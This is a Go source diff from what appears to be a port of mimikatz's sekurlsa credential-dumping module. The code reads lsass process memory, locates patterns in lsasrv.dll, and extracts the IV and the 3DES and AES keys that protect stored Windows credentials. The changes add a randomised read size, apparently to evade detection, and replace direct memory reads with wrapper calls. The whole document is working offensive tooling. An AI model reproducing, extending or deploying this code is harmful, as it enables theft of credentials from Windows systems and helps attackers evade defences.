@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"fmt"
 	"runtime"
-	"sync"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -20,8 +19,6 @@ type lsaNT6 struct {
 	iv      []byte
 	key3DES *api.BcryptKey
 	keyAES  *api.BcryptKey
-
-	mu sync.Mutex
 }
 
 func newLSA6(ctx *Kiwi) *lsaNT6 {
@@ -146,21 +143,21 @@ var (
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
 
 func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
-	lsa.mu.Lock()
-	defer lsa.mu.Unlock()
 	if len(lsa.iv) == 16 && lsa.key3DES != nil && lsa.keyAES != nil {
 		return nil
 	}
+	// read lsasrv memory
 	lsasrv, err := lsa.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
 	}
-	memory := make([]byte, lsasrv.size)
-	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
+	size := uintptr(lsasrv.size - (256 - lsa.ctx.rand.Int(256)))
+	memory := make([]byte, size)
+	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
 	}
-	// find special data offset
+	// select patch and find pattern
 	var patches []*patchGeneric
 	switch runtime.GOARCH {
 	case "386":
@@ -171,20 +168,20 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 	patch := lsa.ctx.selectGenericPatch(patches)
 	index := bytes.Index(memory, patch.search.data)
 	if index == -1 {
-		return errors.WithMessage(err, "failed to search lsa init protected memory reference pattern")
+		return errors.New("failed to search lsa init protected memory reference pattern")
 	}
 	// read offset about iv
 	address := lsasrv.address + uintptr(index+patch.offsets.off0)
 	var offset uint32
-	size := unsafe.Sizeof(offset)
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
+	size = unsafe.Sizeof(offset)
+	err = lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about iv")
 	}
 	// read iv data
 	address += unsafe.Sizeof(offset) + uintptr(offset)
 	lsa.iv = make([]byte, 16)
-	_, err = api.ReadProcessMemory(pHandle, address, &lsa.iv[0], uintptr(16))
+	err = lsa.ctx.readMemory(pHandle, address, &lsa.iv[0], uintptr(16))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read iv data")
 	}
@@ -271,20 +268,20 @@ func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm
 	)
 	var offset int32
 	size := unsafe.Sizeof(offset)
-	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
+	err := lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about bcrypt handle key")
 	}
 	address += unsafe.Sizeof(offset) + uintptr(offset)
 	var bhkAddr uintptr
 	size = unsafe.Sizeof(bhkAddr)
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&bhkAddr)), size)
+	err = lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&bhkAddr)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read address about bcrypt handle key")
 	}
 	var bhKey bcryptHandleKey
 	size = unsafe.Sizeof(bhKey)
-	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhKey)), size)
+	err = lsa.ctx.readMemoryEnd(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhKey)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
@@ -309,7 +306,7 @@ func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm
 		bcryptKeyOffset = unsafe.Offsetof(bcryptKey81{}.hardKey)
 	}
 	bKey := make([]byte, bcryptKeySize)
-	_, err = api.ReadProcessMemory(pHandle, bhKey.key, &bKey[0], bcryptKeySize)
+	err = lsa.ctx.readMemoryEnd(pHandle, bhKey.key, &bKey[0], bcryptKeySize)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt key")
 	}
@@ -319,7 +316,7 @@ func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm
 	hKey := *(*hardKey)(unsafe.Pointer(&bKey[bcryptKeyOffset]))
 	hardKeyData := make([]byte, int(hKey.secret))
 	address = bhKey.key + bcryptKeyOffset + unsafe.Offsetof(hardKey{}.data)
-	_, err = api.ReadProcessMemory(pHandle, address, &hardKeyData[0], uintptr(len(hardKeyData)))
+	err = lsa.ctx.readMemory(pHandle, address, &hardKeyData[0], uintptr(len(hardKeyData)))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
@@ -376,8 +373,6 @@ func (lsa *lsaNT6) generateSymmetricKey(hardKeyData []byte, algorithm string) er
 }
 
 func (lsa *lsaNT6) Close() error {
-	lsa.mu.Lock()
-	defer lsa.mu.Unlock()
 	if lsa.key3DES != nil {
 		err := lsa.key3DES.Destroy()
 		if err != nil {
